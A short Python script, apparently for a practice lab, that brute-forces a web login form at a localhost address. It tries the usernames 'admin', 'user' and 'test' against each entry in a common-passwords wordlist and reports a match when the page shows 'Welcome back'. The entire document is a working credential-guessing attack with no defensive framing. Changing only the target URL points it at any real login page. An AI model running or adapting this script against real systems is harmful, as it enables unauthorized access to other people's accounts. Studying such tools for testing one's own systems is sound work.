import requests
import sys

target = "http://127.0.0.1:5000"
usernames = ["admin", "user", "test"]
passwords = "1K-most-used-passwords-NCSC.txt"
needle = "Welcome back"

for username in usernames:
    with open(passwords, "r") as passwords_list:
        for password in passwords_list:
            password = password.strip("\n").encode()
            sys.stdout.write(f"[X] Attempting user: password -> {username} : {password.decode()}\r")
            sys.stdout.flush()
            r = requests.post(target, 
                            data = {"username" : username, "password" : password})
            if needle.encode() in r.content:
                sys.stdout.write("\n")
                sys.stdout.write(f"\t[>>>>>>] Valid password {password.decode()} found for user {username}")
                sys.exit()
        sys.stdout.flush()
        sys.stdout.write("\n")
        sys.stdout.write(f"\tNo password found for {username}.")

        
